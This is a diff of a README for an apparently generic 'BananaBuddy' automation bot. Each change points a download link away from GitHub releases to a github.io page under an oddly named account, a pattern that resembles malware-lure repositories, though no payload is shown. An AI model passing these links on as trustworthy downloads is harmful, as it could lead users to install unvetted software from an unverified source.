@@ -1,6 +1,6 @@
 # 🍌 bananabuddy-bot-v2026 - Your Personal Task Automation Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-BananaBuddy_v2026-blue?style=for-the-badge&logo=github)](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-BananaBuddy_v2026-blue?style=for-the-badge&logo=github)](https://capitalofnorthcarolinawolfe682.github.io)
 
 ## 🚀 What Is BananaBuddy?
 
@@ -41,7 +41,7 @@ Your computer should meet these basic requirements to run BananaBuddy smoothly:
 ### Step 1: Get the Software
 Visit this link to download the application:
 
-[![Download BananaBuddy](https://img.shields.io/badge/📥-Download_BananaBuddy_v2026-green?style=for-the-badge&logo=github)](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
+[![Download BananaBuddy](https://img.shields.io/badge/📥-Download_BananaBuddy_v2026-green?style=for-the-badge&logo=github)](https://capitalofnorthcarolinawolfe682.github.io)
 
 Visit this link to download the application.
 
@@ -121,6 +121,6 @@ If you encounter problems not covered here, you can:
 BananaBuddy checks for updates automatically. You can also manually check by going to Help > Check for Updates. Keeping the software up-to-date ensures you have the latest features and security improvements.
 
 Visit this link to download the application:  
-[https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases](https://github.com/capitalofnorthcarolinawolfe682/bananabuddy-bot-v2026/releases)
+[https://capitalofnorthcarolinawolfe682.github.io](https://capitalofnorthcarolinawolfe682.github.io)
 
 Keywords: automation, bot, telegram, workflow, cross-platform, task-automation, assistant
